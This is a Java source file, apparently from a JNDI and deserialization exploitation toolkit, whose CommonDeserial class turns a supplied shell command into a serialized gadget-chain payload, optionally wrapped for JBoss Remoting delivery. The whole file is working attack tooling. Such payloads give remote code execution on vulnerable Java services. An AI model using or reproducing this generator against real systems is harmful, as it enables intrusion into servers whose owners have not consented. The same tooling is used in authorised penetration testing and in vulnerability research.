package jndi;

import payloads.*;
import wrappers.*;

import java.lang.reflect.Method;

public class CommonDeserial {
    private String command;

    public CommonDeserial(String command){
        this.command = command;
    }

    public byte[] execByDeserialize(String gadgetType, String wrapperType, Boolean fusion) throws Exception {
        byte[] bytes = {};
//        System.out.println(gadgetType);
        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(gadgetType);
        if ( payloadClass == null || !ObjectPayload.class.isAssignableFrom(payloadClass) ) {
            throw new IllegalArgumentException("No such Deserial Payload Name: " + gadgetType);
        }

        if (wrapperType == null){
            Method method = payloadClass.getMethod("getBytes", String.class, Boolean.class);
            bytes = (byte[])method.invoke(payloadClass.newInstance(), command, fusion);
        }else if (wrapperType.equals("JbossRemoting")){
            Method method = payloadClass.getMethod("getBytes", String.class, Boolean.class);
            bytes = (byte[])method.invoke(payloadClass.newInstance(), command, fusion);
            JbossRemotingWrap wrap = new JbossRemotingWrap();
            bytes = wrap.wrap(bytes);
        }else{
            Method method = payloadClass.getMethod("getObject", String.class);
            Object obj = method.invoke(payloadClass.newInstance(), command);
            // get Wrapper
            final Class<? extends ObjectWrapper> wrapperClass = ObjectWrapper.Utils.getWrapperClass(wrapperType);
//            System.out.println(wrapperClass);
            if ( wrapperClass == null || !ObjectWrapper.class.isAssignableFrom(wrapperClass) ) {
                throw new IllegalArgumentException("No such Wrapper: " + wrapperType);
            }
            Method method2 = wrapperClass.getMethod("wrap", Object.class);
            bytes = (byte[])method2.invoke(wrapperClass.newInstance(), obj);
        }

//        System.out.println("Base64 Payload: " + Base64.getEncoder().encodeToString(bytes));

        return bytes;
    }

}
